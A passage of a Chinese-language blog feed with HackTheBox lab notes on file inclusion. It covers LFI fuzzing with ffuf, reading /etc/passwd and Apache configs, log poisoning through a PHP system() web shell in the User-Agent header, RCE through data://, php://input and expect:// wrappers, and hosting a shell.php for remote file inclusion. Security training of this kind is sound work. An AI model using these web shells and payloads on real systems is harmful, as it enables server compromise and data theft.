&#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287</code></pre><hr><h4 id="Server-Logs-x2F-Configurations"><a href="#Server-Logs-x2F-Configurations" class="headerlink" title="Server Logs&#x2F;Configurations"></a>Server Logs&#x2F;Configurations</h4><p>，我们需要能够识别正确的日志目录，以便能够执行我们讨论的日志中毒攻击。此外，正如我们刚刚讨论的那样，我们可能还需要阅读服务器配置，以便能够识别服务器webroot路径和其他重要信息（如日志路径！）。<br>要做到这一点，我们还可以使用LFI-Jhadix.txt单词列表，因为它包含了我们可能感兴趣的许多服务器日志和配置路径。如果我们想要更精确的扫描，我们可以将此单词列表用于Linux或将此单词表用于Windows，尽管它们不是seclist的一部分，所以我们需要首先下载它们。</p><pre><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287</code></pre><p>许多结果没有用LFI-Jhadix.txt单词列表识别，这向我们表明，在某些情况下，精确的扫描很重要。现在，我们可以尝试读取这些文件中的任何一个，看看是否可以获取它们的内容。我们将阅读（&#x2F;etc&#x2F;apache2&#x2F;apache2.conf），因为它是apache服务器配置的已知路径：</p><pre><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/apache2.conf...SNIP...        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined...SNIP...</code></pre><p>正如我们所看到的，我们确实得到了默认的webroot路径和日志路径。然而，在这种情况下，日志路径使用全局apache变量（apache_log_DIR），该变量在我们上面看到的另一个文件（&#x2F;etc&#x2F;apache2&#x2F;envvars）中找到，我们可以读取它来查找变量值：</p><pre><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/envvars...SNIP...export APACHE_RUN_USER=www-dataexport APACHE_RUN_GROUP=www-data# temporary state file location. This might be changed to /run in Wheezy+1export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pidexport APACHE_RUN_DIR=/var/run/apache2$SUFFIXexport APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.export APACHE_LOG_DIR=/var/log/apache2$SUFFIX...SNIP...</code></pre><p>正如我们所看到的，（APACHE_LOG_DIR）变量被设置为（&#x2F;var&#x2F;LOG&#x2F;apache2），之前的配置告诉我们日志文件是&#x2F;access.LOG和&#x2F;error.LOG，它们在上一节中已经访问过。</p><p>注意：当然，我们可以简单地使用单词列表来查找日志，因为我们在本节中使用的多个单词列表确实显示了日志的位置。但本练习向我们展示了如何手动浏览已识别的文件，然后使用找到的信息进一步识别更多文件和重要信息。这与我们在PHP过滤器部分中读取不同的文件源非常相似，这样的努力可能会揭示以前未知的关于web应用程序的信息，我们可以使用这些信息来进一步利用它。</p><hr><h2 id="LFI-Tools"><a href="#LFI-Tools" class="headerlink" title="LFI Tools"></a>LFI Tools</h2><p>最后，我们可以利用许多LFI工具来自动化我们一直在学习的大部分过程，这在某些情况下可能会节省时间，但也可能会错过我们可能通过手动测试识别的许多漏洞和文件。最常见的LFI工具是LFISuite、LFiFreak和liffy。（ <a href="https://github.com/D35m0nd142/LFISuite">LFISuite</a>, <a href="https://github.com/OsandaMalith/LFiFreak">LFiFreak</a>, and <a href="https://github.com/mzfr/liffy">liffy</a>. ）我们也可以在GitHub中搜索各种其他LFI工具和脚本，但一般来说，大多数工具执行相同的任务，成功率和准确性各不相同。<br>不幸的是，这些工具中的大多数都没有得到维护，并且依赖于过时的python2，因此使用它们可能不是一个长期的解决方案。试着下载上面的任何工具，并在我们在本模块中使用的任何练习中测试它们，以查看它们的准确性水平。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><pre><code>target:104.248.166.174:31381</code></pre><ul><li>模糊web应用程序中公开的参数，然后尝试使用LFI单词列表之一来读取&#x2F;flag.txt</li></ul><p>先扫一下参数：</p><pre><code>fuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://104.248.166.174:31381/index.php?FUZZ=key -t 80 -fs 2309 -mc 200 2&gt;/dev/null view                    [Status: 200, Size: 1935, Words: 515, Lines: 56]</code></pre><p>发现可以使用view，继续fuzz：</p><pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=FUZZ -mc 200 2&gt;/dev/null -fs 1935../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]</code></pre><p>找到一个<code>/etc/passwd</code>,找一下webroot路径：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 1935        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 1935________________________________________________:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]:: Progress: [13/13] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:10] :: Error:: Progress: [13/13] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:10] :: Errors: 0 ::</code></pre><p>应该是这个<code>/var/www/html/</code>,然后再用jhaddix对webroot路径扫描</p><pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ -mc 200 2&gt;/dev/null -fs 1935           .../etc/apache2/apache2.conf [Status: 200, Size: 9159, Words: 1456, Lines: 283]/etc/apt/sources.list   [Status: 200, Size: 4678, Words: 795, Lines: 105]/etc/group              [Status: 200, Size: 2546, Words: 515, Lines: 104]/etc/fstab              [Status: 200, Size: 1972, Words: 520, Lines: 57]/etc/hosts.allow        [Status: 200, Size: 2346, Words: 596, Lines: 66]/etc/hosts.deny         [Status: 200, Size: 2646, Words: 642, Lines: 73]/etc/hosts              [Status: 200, Size: 2172, Words: 520, Lines: 64]../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2172, Words: 520, Lines: 64]/etc/init.d/apache2     [Status: 200, Size: 10116, Words: 2014, Lines: 411]/etc/issue              [Status: 200, Size: 1961, Words: 519, Lines: 58]/etc/mysql/my.cnf       [Status: 200, Size: 2617, Words: 603, Lines: 77]/./././././././././././etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]/etc/passwd             [Status: 200, Size: 3309, Words: 526, Lines: 82]/etc/nsswitch.conf      [Status: 200, Size: 2445, Words: 645, Lines: 76]     ...</code></pre><p>扫描结果很多，找一些比较重要的文件，比如服务器配置文件之类的：</p><p>浏览器访问这个配置文件：<code>/etc/apache2/apache2.conf</code></p><pre><code>http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>  # This is the main Apache server configuration file.  It contains the# configuration directives that give the server its instructions.        ....DefaultRuntimeDir $&#123;APACHE_RUN_DIR&#125;PidFile $&#123;APACHE_PID_FILE&#125;# Timeout: The number of seconds before receives and sends time out.#Timeout 300## KeepAlive: Whether or not to allow persistent connections (more than# one request per connection). Set to &quot;Off&quot; to deactivate.#KeepAlive On## MaxKeepAliveRequests: The maximum number of requests to allow# during a persistent connection. Set to 0 to allow an unlimited amount.# We recommend you leave this number high, for maximum performance.#MaxKeepAliveRequests 100## KeepAliveTimeout: Number of seconds to wait for the next request from the# same client on the same connection.#KeepAliveTimeout 5# These need to be set in /etc/apache2/envvarsUser $&#123;APACHE_RUN_USER&#125;Group $&#123;APACHE_RUN_GROUP&#125;...ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</code></pre><p>这里只截取了一部分，正如我们所看到的，我们确实得到了默认的webroot路径和日志路径。然而，在这种情况下，日志路径使用全局apache变量（apache_log_DIR），该变量在我们上面看到的另一个文件（&#x2F;etc&#x2F;apache2&#x2F;envvars   tip:第28行）中找到，我们可以读取它来查找变量值：</p><p>访问：</p><pre><code>http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/envvars</code></pre><p>&#x3D;&#x3D;&gt;大概如下：</p><pre><code># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.export APACHE_RUN_USER=www-dataexport APACHE_RUN_GROUP=www-data# temporary state file location. This might be changed to /run in Wheezy+1export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pidexport APACHE_RUN_DIR=/var/run/apache2$SUFFIXexport APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.export APACHE_LOG_DIR=/var/log/apache2$SUFFIX## The locale used by some modules like mod_davexport LANG=C## Uncomment the following line to use the system default locale instead:#. /etc/default/localeexport LANG</code></pre><p>我们看到第九行：APACHE_LOG_DIR&#x3D;&#x2F;var&#x2F;log&#x2F;apache2</p><p>注意：当然，我们可以简单地使用单词列表来查找日志，因为我们在本节中使用的多个单词列表确实显示了日志的位置。但本练习向我们展示了如何手动浏览已识别的文件，然后使用找到的信息进一步识别更多文件和重要信息。这与我们在PHP过滤器部分中读取不同的文件源非常相似，这样的努力可能会揭示以前未知的关于web应用程序的信息，我们可以使用这些信息来进一步利用它。</p><p>浏览器看一看日志文件，发现始终读取不了，不知道为啥，直接读取flag吧。</p><h1 id="Skills-Assessment-File-Inclusion"><a href="#Skills-Assessment-File-Inclusion" class="headerlink" title="Skills Assessment - File Inclusion"></a>Skills Assessment - File Inclusion</h1><pre><code>target:104.248.166.174:31609</code></pre><ul><li>评估web应用程序，并使用各种技术来获得远程代码执行，并在文件系统的&#x2F;root目录中找到标志。提交标志的内容作为您的答案</li></ul><p>浏览一下页面，很快发现可能有文件包含漏洞：</p><pre><code>http://104.248.166.174:31609/index.php?page=about</code></pre><p>先看看有没有RCE的机会：</p><pre><code>http://104.248.166.174:31609/index.php?127.0.0.1%EF%BC%9A31609/index.php</code></pre><p>进入了主页面，试一试伪协议：</p><pre><code>http://104.248.166.174:31609/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>Invalid input detected!</code></pre><p>看来只能先用kali扫一扫目录了:</p><pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31609/index.php?page=FUZZ -t 80  2&gt;/dev/null -mc 200</code></pre><p>发现返回两种size的响应，但是都不能用，很烦，只能看看有没有其他页面，扫了很久都没有，看看源码有没有隐藏的注释：</p><pre><code>http://104.248.166.174:31609/index.php?page=php://filter/read=convert.base64-encode/resource=index</code></pre><p>然后解码，搜索用<code>//</code>或者<code>/* ... */</code>注释的内容，好家伙，真的有：</p><pre><code>  // echo &#39;&lt;li&gt;&lt;a href=&quot;ilf_admin/index.php&quot;&gt;Admin&lt;/a&gt;&lt;/li&gt;&#39;; </code></pre><p>看一看这个ilf_admin&#x2F;index.php页面，好家伙，是管理员后台，有很多系统日志，但好像都不是我们能够控制的，但是我们发现URL是这样的：</p><pre><code class="url">http://104.248.166.174:31609/ilf_admin/index.php?log=http.log</code></pre><p>难道？</p><pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31609/ilf_admin/index.php?log=FUZZ   -t 80  2&gt;/dev/null -fs 2046..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2289, Words: 155, Lines: 110]/../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../etc/passwd&amp;=%3C%3C%3C%3C [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]</code></pre><p>ok,try 一下：一般而言使用最短的</p><pre><code>http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../etc/passwd</code></pre><p>发现有结果，那么webroot差不多就在<code>../../../../../</code>这个位置了</p><p>查看一下服务器，是nginx，偷个懒，直接看看常规的log位置能不能读取：</p><pre><code>http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>        ....8.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;104.248.166.174 - - [17/Jun/2023:16:13:19 +0000] &quot;GET /ilf_admin/js/jquery.js HTTP/1.1&quot; 404 188 &quot;http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;104.248.166.174 - - [17/Jun/2023:16:13:19 +0000] &quot;GET /ilf_admin/c.css HTTP/1.1&quot; 404 188 &quot;http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;</code></pre><p>hh,都在这里了，这下应该好弄了，先在url注入shell:<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><pre><code class="request">GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&amp;cmd=id HTTP/1.1Host: 138.68.165.36:31234Upgrade-Insecure-Requests: 1User-Agent: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code class="log">[18/Jun/2023:01:25:42 +0000] &quot;GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log HTTP/1.1&quot; 200 2245 &quot;-&quot; &quot;uid=65534(nobody) gid=65534(nobody)&quot;</code></pre><p>注入成功，读取即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> practice </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File-inclusion:RCE</title>
      <link href="/2023/06/15/file-inclusion-RCE/"/>
      <url>/2023/06/15/file-inclusion-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h1><p>到目前为止，在本模块中，我们一直在利用文件包含漏洞，通过各种方法披露本地文件。从本节中，我们将开始学习如何使用文件包含漏洞在后端服务器上执行代码并获得对它们的控制。<br>我们可以使用许多方法来执行远程命令，每种方法都有特定的用例，因为它们取决于后端语言&#x2F;框架和易受攻击的函数的功能。获得对后端服务器控制的一种简单而常见的方法是枚举用户凭据和SSH密钥，然后使用它们通过SSH或任何其他远程会话登录到后端服务器。例如，我们可能会在config.php这样的文件中找到数据库密码，如果用户重复使用相同的密码，该密码可能会与用户的密码相匹配。或者，我们可以检查每个用户主目录中的.ssh目录，如果读取权限设置不正确，那么我们可以获取他们的私钥（id_rsa），并使用它将ssh连接到系统中。<br>除了这些琐碎的方法之外，还有一些方法可以直接通过易受攻击的函数实现远程代码执行，而不依赖于数据枚举或本地文件权限。在本节中，我们将从PHP web应用程序上的远程代码执行开始。我们将在上一节学习的基础上进行构建，并将利用不同的PHP包装器来获得远程代码执行。然后，在接下来的部分中，我们将学习其他方法来获得远程代码执行，这些方法也可以与PHP和其他语言一起使用。</p><span id="more"></span><h2 id="DATA"><a href="#DATA" class="headerlink" title="DATA"></a><a href="https://www.php.net/manual/en/wrappers.data.php">DATA</a></h2><p>数据包装器可用于包含外部数据，包括PHP代码。但是，只有在PHP配置中启用了（allow_url_include）设置时，才能使用数据包装器。因此，让我们首先通过LFI漏洞读取PHP配置文件来确认是否启用了此设置。</p><p>为此，我们可以在Apache的（&#x2F;etc&#x2F;PHP&#x2F;X.Y&#x2F;apache2&#x2F;PHP.ini）或Nginx的（&#x2F;etc&#x2F;hp&#x2F;X.Y&#x2F;fpm&#x2F;PHP.ini）中包含PHP配置文件，其中X.Y是您的安装PHP版本。我们可以从最新的PHP版本开始，如果找不到配置文件，可以尝试早期版本。我们还将使用上一节中使用的base64过滤器，因为.ini文件与.php文件相似，应该进行编码以避免破坏。最后，我们将使用cURL或Burp而不是浏览器，因为输出字符串可能很长，我们应该能够正确地捕获它：</p><pre><code>curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</code></pre><p>了解如何检查allow_url_include选项可能非常重要，因为该选项在默认情况下未启用，并且是其他几种LFI攻击所必需的，如使用输入包装器或任何RFI攻击，我们将在下面看到。启用此选项并不罕见，因为许多web应用程序都依赖它来正常运行，例如一些WordPress插件和主题。</p><p>启用allow_url_include后，我们可以继续进行数据包装攻击。如前所述，数据包装器可用于包含外部数据，包括PHP代码。我们还可以通过text&#x2F;plain传递base64编码的字符串；base64，并且它能够解码它们并执行PHP代码。<br>因此，我们的第一步是对一个基本的PHP web shell进行base64编码，如下所示：</p><pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; | base64PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==</code></pre><p>现在，我们可以对base64字符串进行URL编码，然后使用data:&#x2F;&#x2F;text&#x2F;plain；base64， 。最后，我们可以使用&amp;cmd&#x3D;<COMMAND>将命令传递到web shell：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></pre><p>我们也可能使用cURL进行相同的攻击，如下所示：</p><pre><code>curl -s &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#39; | grep uid            uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a><a href="https://www.php.net/manual/en/wrappers.php.php">Input</a></h2><p>与<code>data</code> wrapper类似，输入包装器可用于包含外部输入和执行PHP代码。它与数据包装器的区别在于，我们将输入作为POST请求的数据传递给输入wrapper。因此，易受攻击的参数必须接受POST请求才能使此攻击生效。最后，输入wrapper还依赖于allow_url_include设置，如前所述。</p><p>为了重复我们之前的攻击，但使用<code>data</code> wrapper，我们可以向易受攻击的URL发送POST请求，并将我们的web shell添加为POST数据。要执行命令，我们会将其作为GET参数传递，就像我们在之前的攻击中所做的那样：</p><pre><code>-s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid            uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><p>注意：要将我们的命令作为GET请求传递，我们需要易受攻击的函数也接受GET请求（即使用$_request）。如果它只接受POST请求，那么我们可以将命令直接放在PHP代码中，而不是动态web shell（例如&lt;\？PHP system（’id’）？&gt;）</p><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a><a href="https://www.php.net/manual/en/wrappers.expect.php">Expect</a></h2><p>最后，我们可以使用 <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper,，它允许我们通过URL流直接运行命令。Expect的工作原理与我们之前使用的web shell非常相似，但不需要提供web shell，因为它是为执行命令而设计的。<br>然而，expect是一个外部wrapper，因此需要在后端服务器上手动安装和启用它，尽管一些web应用程序的核心功能依赖于它，所以我们可能会在特定情况下找到它。我们可以像前面使用allow_url_include一样确定它是否安装在后端服务器上，但我们会改为grep for expect，如果安装并启用了它，我们会得到以下结果：</p><pre><code> echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep expectextension=expect</code></pre><p>正如我们所看到的，extension-configuration关键字用于启用expect模块，这意味着我们应该能够使用它通过LFI漏洞获得RCE。要使用expect模块，我们可以使用<code>expect://</code>wrapper，然后传递我们想要执行的命令，如下所示：</p><pre><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><p>正如我们所看到的，通过expect模块执行命令相当简单，因为正如前面提到的，这个模块是为执行命令而设计的。Web攻击模块还涵盖了使用带有XXE漏洞的expect模块，因此，如果您对如何在此处使用它有很好的了解，则应该设置为将其与XXE一起使用。<br>这是最常见的三个PHP包装器，用于通过LFI漏洞直接执行系统命令。在接下来的章节中，我们还将介绍<code>phar</code>和<code>zip</code>wrapper，我们可以将其用于允许文件上传的web应用程序，以通过LFI漏洞获得远程执行。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><pre><code>target:165.232.46.252:30054尝试在/使用其中一个PHPwrapper获取RCE</code></pre><p>按照正常流程，应该要想办法知道服务器配置，但是这样的话必须要文件包含，甚至需要找到服务器的语言版本才能查看配置文件，很闭环。。但是一般而言，既然要测它是不是有包含漏洞，直接开始各种包含、伪协议测试好像也没差。。。这点挺让人无语的。</p><p>这道题的话，随便用个伪协议就过了：</p><pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>en.php es.php extension.php image.jpg index.php style.css</code></pre><pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cd /;ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>37809e2f8952f06139011994726d9ef1.txt bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var</code></pre><p>那应该实在这个txt文件里面了</p><pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>HTB&#123;d!$46l3_r3m0t3_url_!nclud3&#125;</code></pre><h1 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion">Remote File Inclusion (RFI)</a></h1><p>到目前为止，在本模块中，我们主要关注本地文件包含（LFI）。然而，在某些情况下，如果易受攻击的功能允许包含远程URL，我们也可以包含远程文件“远程文件包含（RFI）”。这有两个主要好处：<br>列举仅本地端口和web应用程序（即SSRF）<br>通过包含我们托管的恶意脚本来获得远程代码执行<br>在本节中，我们将介绍如何通过RFI漏洞获得远程代码执行。服务器端攻击模块涵盖了各种SSRF技术，这些技术也可能与RFI漏洞一起使用。</p><p>此外，正如我们在上表中可能注意到的，一些函数确实允许包含远程URL，但不允许执行代码。在这种情况下，我们仍然可以利用该漏洞通过SSRF枚举本地端口和web应用程序。</p><p>然而，这可能并不总是可靠的，因为即使启用了此设置，易受攻击的功能也可能不允许从一开始就包含远程URL。因此，确定LFI漏洞是否也容易受到RFI攻击的一种更可靠的方法是尝试包含一个URL，看看我们是否可以获取其内容。首先，我们应该始终从尝试包含本地URL开始，以确保我们的尝试不会被防火墙或其他安全措施阻止。所以，让我们使用(<a href="http://127.0.0.1/index.php)%E4%BD%9C%E4%B8%BA%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E7%9C%8B%E7%9C%8B%E5%AE%83%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%E5%9C%A8%E5%86%85%EF%BC%9A">http://127.0.0.1:80/index.php)作为我们的输入字符串，看看它是否包含在内：</a></p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code></pre><p>如果index.php页面被包括在易受攻击的部分（即历史描述）中，该页面确实容易受到RFI的攻击，因为我们能够包括URL。此外，如果index.php页面没有作为源代码文本包含，而是作为php执行和呈现，因此易受攻击的函数也允许执行php，如果我们在机器上包含恶意的php脚本，这可能会允许我们执行代码。<br>我们还看到，我们能够指定端口80并在该端口上获取web应用程序。如果后端服务器托管任何其他本地web应用程序（例如端口8080），那么我们可以通过在其上应用SSRF技术通过RFI漏洞访问它们。</p><p>注意：包含易受攻击的页面本身（即index.php）可能并不理想，因为这可能会导致递归包含循环并导致后端服务器的DoS。</p><pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php</code></pre><p>现在，我们所需要做的就是托管这个脚本，并通过RFI漏洞将其包含在内。在80或443这样的通用HTTP端口上侦听是个好主意，因为在易受攻击的web应用程序有防火墙阻止传出连接的情况下，这些端口可能会被列入白名单。此外，我们可以通过FTP服务或SMB服务托管脚本，我们将在下面看到。</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><pre><code>sudo python3 -m http.server &lt;LISTENING_PORT&gt;Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) 